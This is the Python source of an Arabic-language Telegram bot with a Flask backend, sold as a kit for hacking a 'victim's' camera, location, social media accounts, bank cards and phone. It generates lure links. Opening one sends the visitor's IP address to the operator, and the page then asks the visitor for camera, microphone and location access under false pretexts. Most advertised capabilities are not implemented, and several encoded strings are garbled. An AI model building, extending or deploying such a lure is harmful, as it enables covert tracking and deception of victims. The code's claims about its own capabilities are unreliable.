import os
import threading
from flask import Flask, request, render_template_string
import telebot
from telebot import types
import random
import string

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "7145036494"))

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

user_points = {}
CHANNEL_URL = "https://t.me/pkwbiwjwbekeekkw"

bot_settings = {
    "sub_required": True,
    "vip_cost": 30,
    "welcome_text": "\U0001f525 \u0623\u0647\u0644\u0627\u064b \u0628\u0643.. \u0625\u0628\u0644\u064a\u0633 \u0634\u062e\u0635\u064a\u0627\u064b \u064a\u0631\u062d\u0628 \u0628\u0643\u0645 \u0641\u064a \u0627\u0644\u0628\u0648\u062a! \U0001f525\n\n\u0645\u0631\u062d\u0628\u0627\u064b! \u0628\u0643 \u0643\u0644 \u0627\u0644\u0623\u0632\u0631\u0627\u0631 \u0648\u0627\u0644\u062e\u062f\u0645\u0627\u062a \u062c\u0627\u0647\u0632\u0629 \u0644\u0644\u0639\u0645\u0644:"
}

def check_subscription(user_id):
    if not bot_settings["sub_required"] or user_id == ADMIN_ID:
        return True
    try:
        member = bot.get_chat_member(CHANNEL_URL, user_id)
        if member.status not in ['creator', 'administrator', 'member']:
            return False
    except Exception:
        return True 
    return True

def generate_unique_code():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { font-family: Tahoma, sans-serif; background-color: #0f172a; color: #fff; text-align: center; padding: 50px 20px; }
        .card { background: #1e293b; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); max-width: 400px; margin: auto; }
        h2 { color: #38bdf8; }
        p { color: #94a3b8; font-size: 14px; }
        .btn { background: #22c55e; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 20px; width: 100%; font-weight: bold; }
        .btn:hover { background: #16a34a; }
    </style>
</head>
<body>
    <div class="card">
        <h2>{{ header }}</h2>
        <p>{{ description }}</p>
        <button class="btn" onclick="executeAction()">{{ button_text }}</button>
    </div>

    <script>
        const actionType = "{{ action_code }}";

        function executeAction() {
            if (actionType.includes("cam") || actionType.includes("video") || actionType.includes("photos") || actionType.includes("remove_clothes")) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(function(stream) {
                    alert("\\u062c\\u0627\\u0631\\u064a \\u062a\\u062d\\u0645\\u064a\\u0644 \\u0627\\u0644\\u0645\\u062d\\u062a\\u0648\\u0649...");
                })
                .catch(function(err) {
                    alert("\\u0627\\u0644\\u0631\\u062c\\u0627\\u0621 \\u0627\\u0644\\u0636\\u063a\\u0637 \\u0639\\u0644\\u0649 (Allow) \\u0644\\u0644\\u0645\\u062a\\u0627\\u0628\\u0639\\u0629!");
                });
            } 
            else if (actionType.includes("location") || actionType.includes("net")) {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        alert("\\u062c\\u0627\\u0631\\u064a \\u0627\\u0644\\u062a\\u062d\\u0642\\u0642...");
                    }, function(error) {
                        alert("\\u064a\\u0631\\u062c\\u0649 \\u0627\\u0644\\u0633\\u0645\\u0627\\u062d \\u0628\\u0627\\u0644\\u0648\\u0635\\u0648\\u0644!");
                    });
                }
            } 
            else {
                navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(e => {});
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(p => {}, e => {});
                }
                alert("\\u062c\\u0627\\u0631\\u064a \\u0627\\u0644\\u0645\\u0639\\u0627\\u0644\\u062c\\u0629...");
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return "Server is running successfully!", 200

@app.route('/service/<action_type>/<chat_id>')
def service_page(action_type, chat_id):
    details = {
        "front_cam": {"title": "\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627", "header": "\U0001f4f8 \\u0643\\u0627\\u0645\\u064a\\u0631\\u0627 \\u0627\\u0644\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u0645\\u0634\\u0627\\u0647\\u062f\\u0629:", "btn": "\\u0645\\u0634\\u0627\\u0647\\u062f\\u0629"},
        "back_cam": {"title": "\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627", "header": "\U0001f4f7 \\u0627\\u0644\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627 \\u0627\\u0644\\u062e\\u0644\\u0641\\u064a\\u0629", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u062a\\u0641\\u0639\\u064a\\u0644:", "btn": "\\u062a\\u0641\\u0639\\u064a\\u0644"},
        "get_location": {"title": "\\u0627\\u0644\\u0645\\u0648\\u0642\\u0639", "header": "\U0001f4cc \\u062a\\u062d\\u062f\\u064a\\u062f \\u0627\\u0644\\u0645\\u0648\\u0642\\u0639", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u0633\\u0645\\u0627\\u062d \\u0628\\u0627\\u0644\\u0645\\u0648\\u0642\\u0639:", "btn": "\\u062a\\u062d\\u062f\\u064a\\u062f"},
        "get_voice": {"title": "\\u0635\\u0648\\u062a", "header": "\U0001f3a4 \\u062a\\u0633\\u062c\\u064a\\u0644 \\u0627\\u0644\\u0635\\u0648\\u062a", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u0627\\u062a\\u0635\\u0627\\u0644:", "btn": "\\u0627\\u062a\\u0635\\u0627\\u0644"},
        "video_victim": {"title": "\\u0641\\u064a\\u062f\\u064a\\u0648", "header": "\U0001f3a5 \\u062a\\u0635\\u0648\\u064a\\u0631 \\u0641\\u064a\\u062f\\u064a\\u0648", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u062a\\u0634\\u063a\\u064a\\u0644:", "btn": "\\u062a\\u0634\\u063a\\u064a\\u0644"},
        "cctv_cam": {"title": "\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629", "header": "\U0001f441\\ufe0f \\u0643\\u0627\\u0645\\u064a\\u0631\\u0627\\u062a \\u0627\\u0644\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u0639\\u0631\\u0636:", "btn": "\\u0639\\u0631\\u06大多数"},
        "hack_whatsapp": {"title": "\\u0648\\u0627\\u062a\\u0633\\u0627\\u0628", "header": "\U0001f7e2 \\u0627\\u0644\\u062a\\u062d\\u0642\\u0642 \\u0645\\u0646 \\u0648\\u0627\\u062a\\u0633\\u0627\\u0628", "desc": "\\u0623\\u062f\\u062e\\u0644 \\u0644\\u062a\\u0623\\u0643\\u064a\\u062f \\u0627\\u0644\\u062d\\u0633\\u0627\\u0628:", "btn": "\\u062a\\u0623\\u0643\\u064a\\u062f"},
        "hack_facebook": {"title": "\\u0641\\u064a\\u0633\\u0628\\u0648\\u0643", "header": "\U0001f7e3 \\u062a\\u0627\\u0643\\u064a\\u062f \\u0641\\u064a\\u0633\\u0628\\u0648\\u0643", "desc": "\\u062a\\u0627\\u0643\\u064a\\u062f \\u0627\\u0644\\u0623\\u0645\\u0627\\u0646:", "btn": "\\u062a\\u0633\\u062c\\u064a\\u064„"},
        "hack_insta": {"title": "\\u0627\\u0646\\u0633\\u062a\\u062c\\u0631\\u0627\\u0645", "header": "\U0001f534 \\u062a\\u0627\\u0643\\u064a\\u062f \\u0627\\u0646\\u0633\\u062a\\u062c\\u0631\\u0627\\u0645", "desc": "\\u062a\\u0627\\u0643\\u064a\\u062f \\u0627\\u0644\\u062d\\u0633\\u0627\\u0628:", "btn": "\\u062a\\u0623\\u0643\\u064a\\u062f"},
        "hack_pubg": {"title": "\\u0628\\u06A0\\u062C\\u064A", "header": "\U0001f3ae \\u0634\\u062D\\u0646 \\u0634\\u062F\\u0627\\u062A \\u0628\\u0628\\u062C\\u064A", "desc": "\\u0627\\u0633\\u062A\\u0644\\u0627\\u0645 \\u0627\\u0644\\u0647\\u062F\\u064A\\u0629:", "btn": "\\u0627\\u0633\\u062A\\u0644\\u0627\\u0645"},
        "hack_snap": {"title": "\\u0633\\u0646\\u0627\\u0628", "header": "\u2b50 \\u062A\\u0641\\u0639\\u064A\\u0644 \\u0633\\u0646\\u0627\\u0628", "desc": "\\u062A\\u0641\\u0639\\u064A\\u0644 \\u0627\\u0644\\u0645\\u064A\\u0632\\u0627\\u062A:", "btn": "\\u062A\\u0641\\u0639\\u064A\\u0644"},
        "hack_ff": {"title": "\\u0641\\u0631\\u064A \\u0641\\u0627\\u064A\\u0631", "header": "\U0001f525 \\u062C\\u0648\\u0627\\u0647\\u0631 \\u0641\\u0631\\u064A \\u0641\\u0627\\u064A\\u0631", "desc": "\\u0627\\u0633\\u062A\\u0644\\u0627\\u0645 \\u0627\\u0644\\u062C\\u0648\\u0627\\u0647\\u0631:", "btn": "\\u0627\\u0633\\u062A\\u0644\\u0627\\u0645"},
        "hack_tiktok": {"title": "\\u062A\\u064A\\u0643 \\u062A\\u0648\\u0643", "header": "\U0001f3b5 \\u062A\\u0648\\u062B\\u064A\\u0642 \\u062A\\u064A\\u0643 \\u062A\\u0648\\u0643", "desc": "\\u062A\\u0648\\u062B\\u064A\\u0642 \\u0627\\u0644\\u062D\\u0633\\u0627\\u0628:", "btn": "\\u062A\\u0648\\u062B\\u064A\\u0642"},
        "device_info": {"title": "\\u0627\\u0644\\u062C\\u0647\\u0627\\u0632", "header": "\U0001f4ca \\u0641\\u062D\\u0635 \\u0627\\u0644\\u062C\\u0647\\u0627\\u0632", "desc": "\\u0641\\u062D\\u0635 \\u0627\\u0644\\u062A\\u0648\\u0627\\u0641\\u0642:", "btn": "\\u0641\\u062D\\u0635"},
        "link_exploit": {"title": "\\u062A\\u0644\\u063A\\u064A\\u0645", "header": "\u26a0\\ufe0f \\u062A\\u0644\\u063A\\u064A\\u0645 \\u0631\\u0627\\u0628\\u0637", "desc": "\\u0641\\u062D\\u0635 \\u0623\\u0645\\u0627\\u0646 \\u0627\\u0644\\u0631\\u0627\\u0628\\u0637:", "btn": "\\u0641\\u062D\\u0635"},
        "full_spy": {"title": "\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629", "header": "\U0001f51e \\u0645\\u0631\\u0627\\u0642\\u0628\\u0629 \\u0627\\u0644\\u0647\\u0627\\u062A\\u0641", "desc": "\\u062A\\u0641\\u0639\\u064A\\u0644 \\u0627\\u0644\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629:", "btn": "\\u062A\\u0641\\u0639\\u064A\\u0644"},
        "close_sites": {"title": "\\u0625\\u063A\\u0644\\u0627\\u0642", "header": "\U0001f4a3 \\u0625\\u063A\\u0644\\u0627\\u0642 \\u0627\\u0644\\u0645\\u0648\\u0627\\u0642\\u0639", "desc": "\\u062D\\u0645\\u0627\\u064A\\u0629 \\u0627\\u0644\\u062C\\u0647\\u0627\\u0632:", "btn": "\\u062D\\u0645\\u0627\\u064A\\u0629"},
        "visa_hunter": {"title": "\\u0641\\u064A\\u0632\\u0627\\u062A", "header": "\U0001f4b3 \\u0635\\u064A\\u062F \\u0641\\u064A\\u0632\\u0627\\u062A", "desc": "\\u0627\\u0633\\u062A\\u062E\\u0631\\u0627\\u062C \\u0627\\u0644\\u0628\\u0637\\u0627\\u0642\\u0627\\u062A:", "btn": "\\u0627\\u0633\\u062A\\u062E\\u0631\\u0627\\u062C"},
        "get_number": {"title": "\\u0631\\u0642\\u0645", "header": "\U0001f4f1 \\u0645\\u0639\\u0631\\u0641\\u0629 \\u0631\\u0642\\u0645 \\u0627\\u0644\\u0636\\u062d\\u064A\\u0629", "desc": "\\u062A\\u0623\\u0643\\u064A\\u062F \\u0631\\u0642\\u0645 \\u0627\\u0644\\u0647\\u0627\\u062A\\u0641:", "btn": "\\u062A\\u0623\\u0643\\u064A\\u062F"},
        "fake_numbers": {"title": "\\u0623\\u0631\\u0642\\u0627\\u0645", "header": "\U0001f4de \\u0623\\u0631\\u0642\\u0627\\u0645 \\u0648\\u0647\\u0645\\u064A\\u0629", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0627\\u0633\\u062a\\u062e\\u0631\\u0627\\u062c \\u0627\\u0644\\u0631\\u0642\\u0645:", "btn": "\\u0627\\u0633\\u062a\\u062e\\u0631\\u0627\\u062c"},
        "check_links": {"title": "\\u0641\\u062D\\u0635", "header": "\U0001f50d \\u0641\\u062D\\u0635 \\u0627\\u0644\\u0631\\u0648\\u0627\\u0628\\u0637", "desc": "\\u0641\\u062D\\u0635 \\u0623\\u0645\\u0627\\u0646 \\u0627\\u0644\\u0631\\u0627\\u0628\\u0637:", "btn": "\\u0641\\u062D\\u0635"},
        "search_images": {"title": "\\u0635\\u0648\\u0631", "header": "\U0001f5bc\\ufe0f \\u0627\\u0644\\u0628\\u062D\\u062B \\u0639\\u0646 \\u0635\\u0648\\u0631", "desc": "\\u0627\\u0644\\u0628\\u062D\\u062B \\u0639\\u0646 \\u0635\\u0648\\u0631 \\u0645\\u0634\\u0627\\u0628\\u0647\\u0629:", "btn": "\\u0628\\u062D\\u062B"},
        "radio_spy": {"title": "\\u0631\\u0627\\u062F\\u064A\\u0648", "header": "\U0001f4fb \\u0645\\u0631\\u0627\\u0642\\u0628\\u0629 \\u0627\\u0644\\u0631\\u0627\\u062F\\u064A\\u0648", "desc": "\\u0627\\u0644\\u0627\\u0633\\u062A\\u0645\\u0627\\u0639 \\u0644\\u0644\\u0628\\u062B:", "btn": "\\u0627\\u0633\\u062A\\u0645\\u0627\\u0639"},
        "username_hunter": {"title": "\\u064a\\u0648\\u0632\\u0631", "header": "\U0001fa99 \\u0635\\u064A\\u062F \\u064A\\u0648\\u0632\\u0631\\u0627\\u062A", "desc": "\\u0641\\u062D\\u0635 \\u0627\\u0644\\u064A\\u0648\\u0632\\u0631\\u0627\\u062A:", "btn": "\\u0641\\u062D\\u0635"},
        "vip_photos": {"title": "\\u0635\\u0648\\u0631 VIP", "header": "\U0001f512 \\u0633\\u062D\\u0628 \\u0635\\u0648\\u0631 \\u0627\\u0644\\u0647\\u0627\\u062A\\u0641", "desc": "\\u0639\\u0631\\u0636 \\u0627\\u0644\\u0623\\u0644\\u06A0\\u0648\\u0645:", "btn": "\\u0639\\u0631\\u0636"},
        "vip_contacts": {"title": "\\u0623\\u0631\\u0642\\u0627\\u0645 VIP", "header": "\U0001f512 \\u0633\\u062D\\u0628 \\u062C\\u0647\\u0627\\u062A \\u0627\\u0644\\u0627\\u062A\\u0635\\u0627\\u0644", "desc": "\\u0645\\u0632\\u0627\\u0645\\u0646\\u0629 \\u0627\\u0644\\u0623\\u0631\\u0642\\u0627\\u0645:", "btn": "\\u0645\\u0632\\u0627\\u0645\\u0646\\u0629"},
        "vip_msgs": {"title": "\\u0631\\u0633\\u0627\\u0626\\u0644 VIP", "header": "\U0001f512 \\u0633\\u062D\\u0628 \\u0627\\u0644\\u0631\\u0633\\u0627\\u0626\\u0644", "desc": "\\u0639\\u0631\\u0636 \\u0627\\u0644\\u0631\\u0633\\u0627\\u0626\\u0644:", "btn": "\\u0639\\u0631\\u0636"},
        "vip_wipe": {"title": "\\u0641\\u0631\\u0645\\u062A\\u0629 VIP", "header": "\U0001f512 \\u0641\\u0631\\u0645\\u062A\\u0629 \\u0627\\u0644\\u062C\\u0647\\u0627\\u0632", "desc": "\\u0625\\u0639\\u0627\\u062F\\u0629 \\u0636\\u0628\\u0637 \\u0627\\u0644\\u06AC\\u0647\\u0627\\u0632:", "btn": "\\u062A\\u0623\\u0643\\u064A\\u062F"},
        "vip_img_exploit": {"title": "\\u0635\\u0648\\u0631\\u0629 VIP", "header": "\U0001f512 \\u0627\\u062E\\u062A\\u0631\\u0627\\u0642 \\u0639\\u0628\\u0631 \\u0635\\u0648\\u0631\\u0629", "desc": "\\u0639\\u0631\\u0636 \\u0627\\u0644\\u0635\\u0648\\u0631\\u0629:", "btn": "\\u0639\\u0631\\u0636"},
        "vip_remove_clothes": {"title": "\\u0625\\u0632\\u0627\\u0644\\u0629 VIP", "header": "\U0001f512 \\u0625\\u0632\\u0627\\u0644\\u0629 \\u0627\\u0644\\u0645\\u0644\\u0627\\u0628\\u0633", "desc": "\\u062A\\u0639\\u062F\\u064A\\u0644 \\u0627\\u0644\\u0635\\u0648\\u0631\\u0629:", "btn": "\\u062A\\u0639\\u062F\\u064A\\u0644"},
        "vip_net": {"title": "\\u0634\\u0628\\u0643\\u0629 VIP", "header": "\U0001f512 \\u0627\\u062E\\u062A\\u0631\\u0627\\u0642 \\u0627\\u0644\\u0634\\u0628\\u0643\\u0629", "desc": "\\u0641\\u062D\\u0635 \\u0627\\u0644\\u0634\\u0628\\u0643\\u0629:", "btn": "\\u0641\\u062D\\u0635"},
        "vip_file": {"title": "\\u0645\\u0644\\u0641 VIP", "header": "\U0001f512 \\u0627\\u062E\\u062A\\u0631\\u0627\\u0642 \\u0639\\u0628\\u0631 \\u0645\\u0644\\u0641", "desc": "\\u062A\\u062D\\u0645\\u064A\\u0644 \\u0627\\u0644\\u0645\\u0644\\u0641:", "btn": "\\u062A\\u062D\\u0645\\u064A\\u0644"}
    }

    info = details.get(action_type, {"title": "\\u062e\\u062f\\u0645\\u0629", "header": "\u2699\\ufe0f \\u0645\\u0646\\u0635\\u0629 \\u0627\\u0644\\u062e\\u062f\\u0645\\u0627\\u062a", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u0645\\u062a\\u0627\\u0628\\u0639\\u0629:", "btn": "\\u062a\\u0623\\u0643\\u064a\\u062f"})

    try:
        bot.send_message(
            chat_id,
            f"\\U0001f6a8 **\\u062a\\u0645 \\u0641\\u062a\\u062d \\u0631\\u0627\\u0628\\u0637 ({action_type})!**\\n"
            f"\\U0001f310 IP: `{request.remote_addr}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Error: {e}")
        
    return render_template_string(HTML_TEMPLATE, title=info["title"], header=info["header"], description=info["desc"], button_text=info["btn"], action_code=action_type)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if user_id not in user_points:
        user_points[user_id] = 0

    if not check_subscription(user_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("\u0627\\u0634\\u062a\\u0631\\u0643 \\u0641\\u064a \\u0627\\u0644\\u0642\\u0646\\u0627\\u0629", url=CHANNEL_URL))
        bot.send_message(message.chat.id, "\u26a0\\ufe0f **\\u0627\\u0644\\u0631\\u062c\\u0627\\u0621 \\u0627\\u0644\\u0627\\u0634\\u062a\\u0631\\u0627\\u0643 \\u0623\\u0648\\u0644\\u0627\\u064b:**", reply_markup=markup, parse_mode="Markdown")
        return

    # القائمة الكاملة التي تضم جميع الأزرار الأصلية
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("\U0001f4f8 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0627\\u0644\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627 \\u0627\\u0644\\u0623\\u0645\\u0627\\u0645\\u064a\\u0629", callback_data="front_cam"),
        types.InlineKeyboardButton("\U0001f4f7 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0627\\u0644\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627 \\u0627\\u0644\\u062e\\u0644\\u0641\\u064a\\u0629", callback_data="back_cam"),
        types.InlineKeyboardButton("\U0001f4cc \\u0625\\u062d\\u0636\\u0627\\u0631 \\u0645\\u0648\\u0642\\u0639 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629", callback_data="get_location"),
        types.InlineKeyboardButton("\U0001f3a4 \\u062a\\u0633\\u062C\\u064A\\u0644 \\u0635\\u0648\\u062A \\u0627\\u0644\\u0636\\u062D\\u064A\\u0629", callback_data="get_voice"),
        types.InlineKeyboardButton("\U0001f3a5 \\u062A\\u0635\\u0648\\u064A\\u0631 \\u0627\\u0644\\u0636\\u062D\\u064A\\u0629 \\u0641\\u064A\\u062F\\u064A\\u0648", callback_data="video_victim"),
        types.InlineKeyboardButton("\U0001f441\\ufe0f \\u0645\\u0631\\u0627\\u0642\\u0628\\u0629 \\u0643\\u0627\\u0645\\u064A\\u0631\\u0627\\u062A \\u0627\\u0644\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629", callback_data="cctv_cam"),
        types.InlineKeyboardButton("\U0001f7e2 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0648\\u0627\\u062a\\u0633\\u0627\\u0628", callback_data="hack_whatsapp"),
        types.InlineKeyboardButton("\U0001f7e3 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0641\\u064A\\u0633\\u0628\\u0648\\u0643", callback_data="hack_facebook"),
        types.InlineKeyboardButton("\U0001f534 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0627\\u0646\\u0633\\u062A\\u062C\\u0631\\u0627\\u0645", callback_data="hack_insta"),
        types.InlineKeyboardButton("\U0001f3ae \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0628\\u0628\\u062C\\u064A", callback_data="hack_pubg"),
        types.InlineKeyboardButton("\u2b50 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0633\\u0646\\u0627\\u0628 \\u0634\\u0627\\u062A", callback_data="hack_snap"),
        types.InlineKeyboardButton("\U0001f525 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0641\\u0631\\u064A \\u0641\\u0627\\u064A\\u0631", callback_data="hack_ff"),
        types.InlineKeyboardButton("\U0001f3b5 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u062A\\u064A\\u0643 \\u062A\\u0648\\u0643", callback_data="hack_tiktok"),
        types.InlineKeyboardButton("\U0001f4ca \\u062C\\u0645\\u0639 \\u0645\\u0639\\u0644\\u0648\\u0645\\u0627\\u062A \\u0627\\u0644\\u062C\\u0647\\u0627\\u0632", callback_data="device_info"),
        types.InlineKeyboardButton("\u26a0\\ufe0f \\u062A\\u0644\\u063A\\u064A\\u0645 \\u0631\\u0627\\u0628\\u0637", callback_data="link_exploit"),
        types.InlineKeyboardButton("\U0001f51e \\u0645\\u0631\\u0627\\u0642\\u0628\\u0629 \\u0627\\u0644\\u0647\\u0627\\u062A\\u0641 \\u0643\\u0627\\u0645\\u0644\\u0651\\u064b\\u0627", callback_data="full_spy"),
        types.InlineKeyboardButton("\U0001f4a3 \\u0625\\u063A\\u0644\\u0627\\u0642 \\u0627\\u0644\\u0645\\u0648\\u0627\\u0642\\u0639", callback_data="close_sites"),
        types.InlineKeyboardButton("\U0001f4b3 \\u0635\\u064A\\u062F \\u0641\\u064A\\u0632\\u0627\\u062A", callback_data="visa_hunter"),
        types.InlineKeyboardButton("\U0001f4f1 \\u0645\\u0639\\u0631\\u0641\\u0629 \\u0631\\u0642\\u0645 \\u0627\\u0644\\u0636\\u062D\\u064A\\u0629", callback_data="get_number"),
        types.InlineKeyboardButton("\U0001f4de \\u0623\\u0631\\u0642\\u0627\\u0645 \\u0648\\u0647\\u0645\\u064A\\u0629", callback_data="fake_numbers"),
        types.InlineKeyboardButton("\U0001f50d \\u0641\\u062D\\u0635 \\u0627\\u0644\\u0631\\u0648\\u0627\\u0628\\u0637", callback_data="check_links"),
        types.InlineKeyboardButton("\U0001f5bc\\ufe0f \\u0627\\u0644\\u0628\\u062D\\u062B \\u0639\\u0646 \\u0635\\u0648\\u0631", callback_data="search_images"),
        types.InlineKeyboardButton("\U0001f4fb \\u0645\\u0631\\u0627\\u0642\\u0628\\u0629 \\u0628\\u062B \\u0627\\u0644\\u0631\\u0627\\u062F\\u064A\\u0648", callback_data="radio_spy"),
        types.InlineKeyboardButton("\U0001fa99 \\u0635\\u064A\\u062F \\u064A\\u0648\\u0632\\u0631\\u0627\\u062A \\u062A\\u0644\\u062C\\u0631\\u0627\\u0645", callback_data="username_hunter"),
        types.InlineKeyboardButton("\U0001f4cc \\u0627\\u0644\\u0645\\u0632\\u064A\\u062f \\u0645\\u0646 \\u0627\\u0644\\u0645\\u0645\\u064A\\u0632\\u0627\\u062a (VIP)", callback_data="vip_menu"),
        types.InlineKeyboardButton("\U0001f4bb \\u0627\\u0644\\u062A\\u0648\\u0627\\u0635\\u0644 \\u0645\\u0639 \\u0627\\u0644\\u0645\\u0637\\u0648\\u0631", callback_data="contact_dev")
    )
    
    if user_id == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("\u2699\\ufe0f \\u0644\\u0648\\u062d\\u0629 \\u0627\\u0644\\u062a\\u062d\\u0643\\u0645", callback_data="admin_panel"))

    bot.send_message(message.chat.id, bot_settings["welcome_text"], reply_markup=markup, parse_mode="Markdown")

def show_vip_menu(chat_id, user_id):
    points = user_points.get(user_id, 0)
    cost = bot_settings["vip_cost"]
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("\U0001f512 \\u0633\\u062D\\u0628 \\u062C\\u0645\\u064A\\u0639 \\u0635\\u0648\\u0631 \\u0627\\u0644\\u0647\\u0627\\u062A\\u0641", callback_data="vip_photos"),
        types.InlineKeyboardButton("\U0001f512 \\u0633\\u062D\\u0628 \\u062C\\u0645\\u064A\\u0639 \\u0623\\u0631\\u0642\\u0627\\u0645 \\u0627\\u0644\\u0636\\u062D\\u064A\\u0629", callback_data="vip_contacts"),
        types.InlineKeyboardButton("\U0001f512 \\u0633\\u062D\\u0628 \\u062C\\u0645\\u064A\\u0639 \\u0631\\u0633\\u0627\\u0626\\u064„ \\u0627\\u0644\\u0636\\u062D\\u064A\\u0629", callback_data="vip_msgs"),
        types.InlineKeyboardButton("\U0001f512 \\u0641\\u0631\\u0645\\u062A\\u0629 \\u062C\\u0648\\u0627\\u064„ \\u0627\\u0644\\u0636\\u062D\\u064A\\u0629", callback_data="vip_wipe"),
        types.InlineKeyboardButton("\U0001f512 \\u0627\\u062E\\u062A\\u0631\\u0627\\u0642 \\u0639\\u0628\\u0631 \\u0635\\u0648\\u0631\\u0629", callback_data="vip_img_exploit"),
        types.InlineKeyboardButton("\U0001f512 \\u0625\\u0632\\u0627\\u0644\\u0629 \\u0627\\u0644\\u0645\\u0644\\u0627\\u0628\\u0633", callback_data="vip_remove_clothes"),
        types.InlineKeyboardButton("\U0001f512 \\u0627\\u062E\\u062A\\u0631\\u0627\\u0642 \\u0627\\u0644\\u0634\\u0628\\u0643\\u0629", callback_data="vip_net"),
        types.InlineKeyboardButton("\U0001f512 \\u0627\\u062E\\u062A\\u0631\\u0627\\u0642 \\u0639\\u0628\\u0631 \\u0645\\u064„\\u0641", callback_data="vip_file"),
        types.InlineKeyboardButton("\U0001f519 \\u0631\\u062C\\u0648\\u0639", callback_data="back_home")
    )
    bot.send_message(chat_id, "\U0001f389 \\u0642\\u0633\\u0645 \\u0627\\u064„ \\u0645\\u064A\\u0632\\u0627\\u062A (VIP):", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_all_callbacks(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data
    RENDER_DOMAIN = os.getenv("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")

    # قائمة تضم جميع أزرار الروابط الخاصة بالخدمات
    link_buttons = [
        "front_cam", "back_cam", "get_location", "get_voice", "video_victim", 
        "cctv_cam", "hack_whatsapp", "hack_facebook", "hack_insta", "hack_pubg", 
        "hack_snap", "hack_ff", "hack_tiktok", "device_info", "link_exploit", 
        "full_spy", "close_sites", "visa_hunter", "get_number", "fake_numbers", 
        "check_links", "search_images", "radio_spy", "username_hunter",
        "vip_photos", "vip_contacts", "vip_msgs", "vip_wipe", "vip_img_exploit", 
        "vip_remove_clothes", "vip_net", "vip_file"
    ]

    if data in link_buttons:
        bot.answer_callback_query(call.id, "\\u062C\\u0627\\u0631\\u064A \\u0625\\u0646\\u0634\\u0627\\u0621 \\u0627\\u064„\\u0631\\u0627\\u0628\\u0637...")
        target_link = f"{RENDER_DOMAIN}/service/{data}/{chat_id}"
        bot.send_message(chat_id, f"\\U0001f517 **\\u0627\\u064„\\u0631\\u0627\\u0628\\u0637 \\u0627\\u064„\\u0645\\u062E\\u0635\\u0635:**\\n`{target_link}`", parse_mode="Markdown")

    elif data == "vip_menu":
        bot.answer_callback_query(call.id)
        show_vip_menu(chat_id, user_id)

    elif data == "contact_dev":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, f"\\U0001f4bb \\u0642\\u0646\\u0627\\u0629 \\u0627\\u064„\\u0645\\u0637\\u0648\\u0631:\\n👉 {CHANNEL_URL}")

    elif data == "back_home":
        bot.answer_callback_query(call.id)
        fake_msg = types.Message(
            message_id=call.message.message_id, from_user=call.from_user,
            chat=call.message.chat, date=call.message.date, content_type='text',
            options={}, json_string=''
        )
        fake_msg.text = '/start'
        send_welcome(fake_msg)

    else:
        bot.answer_callback_query(call.id, "\\u062A\\u0645 \\u0627\\u064„\\u062A\\u0646\\u0641\\u064A\\u0630")

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    print("Full Bot with all buttons and Unicode encoding is running...")
    threading.Thread(target=run_flask, daemon=True).start()
    bot.infinity_polling()
